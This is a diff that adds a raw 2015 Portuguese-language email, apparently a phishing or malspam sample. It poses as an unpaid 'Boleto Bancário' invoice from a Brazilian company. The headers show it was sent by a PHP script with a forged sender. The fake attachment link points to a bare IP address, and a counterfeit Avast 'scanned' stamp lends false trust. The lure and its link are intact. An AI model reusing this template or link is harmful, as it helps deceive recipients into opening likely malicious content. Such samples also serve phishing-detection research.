@@ -1,0 +1,73 @@
+Return-path: <"www-data@washington.garcia"@ecp.com.br>
+Envelope-to: parise@digitalfotoimagem.com.br
+Delivery-date: Tue, 24 Nov 2015 11:57:29 -0200
+Received: from [137.116.169.250] (port=1072 helo=vmwarexe.xxgames01.h9.internal.cloudapp.net)
+	by hserv20.homehost.com.br with esmtp (Exim 4.86)
+	(envelope-from <"www-data@washington.garcia"@ecp.com.br>)
+	id 1a1E65-0007g1-4H
+	for parise@digitalfotoimagem.com.br; Tue, 24 Nov 2015 11:57:29 -0200
+Received: by vmwarexe.xxgames01.h9.internal.cloudapp.net (Postfix, from userid 33)
+	id 362BA27991; Tue, 24 Nov 2015 13:56:34 +0000 (UTC)
+To: parise@digitalfotoimagem.com.br
+Subject: Boleto Bancário
+X-PHP-Originating-Script: 0:send.php
+From: parinha9 <parinha9@hotmail.com>
+MIME-Version: 1.0
+Content-type: text/html; charset=iso-8859-1
+X-Mailer: Microsoft Office Outlook, Build 17.551210
+Message-Id: <20151124135634.362BA27991@vmwarexe.xxgames01.h9.internal.cloudapp.net>
+Date: Tue, 24 Nov 2015 13:56:34 +0000 (UTC)
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Boleto Bancário</title>
+</head>
+
+<body>
+<div> <img blockable_image="true" id="IMG" src="http://www.businessinformativos.com.br/Informativos_online/business_email_cabecalho1.jpg" />
+  <hr />
+  <h2 align="center">Boleto Bancário</h2>
+  <p>Prezado Cliente</p>
+  <br />
+  <p>Não consta, em nossos controles, o pagamento da fatura abaixo:<br />
+  </p>
+  <table>
+    <tbody>
+      <tr>
+        <td><strong>Nome do Sacado</strong></td>
+        <td>CLAVIS ORGANIZACAO CONTABIL LTDA</td>
+      </tr>
+      <tr>
+        <td><strong>Vencimento Título</strong></td>
+        <td>30/11/2015</td>
+      </tr>
+      <tr>
+        <td><strong>Valor do Título</strong></td>
+        <td>111,50</td>
+      </tr>
+    </tbody>
+  </table>
+  <p><img id="_x0000_i1025" src="http://gfx2.hotmail.com/mail/w3/ltr/i_attach.gif" height="12" hspace="5" width="7" />1 anexo: <br />
+  <a href="http://107.170.65.218/wp/index.php">Boleto_Bancário</a> (510,0KB) </p>
+  <p>Se o presente título estiver pago, ou houver alguma discordância quanto ao seu vencimento ou valor,<br />
+pedimos que entre em contato com nosso departamento financeiro para maiores esclarecimentos.<br />
+  </p>
+  <p>Atenciosamente,</p>
+  BUSINESS - ED. E PUBL. DE INFORMATIVOS LTDA
+  <p>Fone-Fax 47-3371-0619</p>
+  <a target="_blank" href="http://www.businessinformativos.com.br">www.businessinformativos.com.br</a></div>
+<table>
+  <tbody>
+    <tr>
+      <td><a href="https://www.avast.com/antivirus" target="_blank"> <img src="http://static.avast.com/emails/avast-mail-stamp.png" alt="Avast logo" border="0" /></a></td>
+      <td><p> Este email foi escaneado pelo Avast antivírus. <br />
+        <a href="https://www.avast.com/antivirus" target="_blank">www.avast.com</a></p></td>
+    </tr>
+  </tbody>
+</table>
+<p> </p>
+<p>&nbsp;</p>
+</body>
+</html>
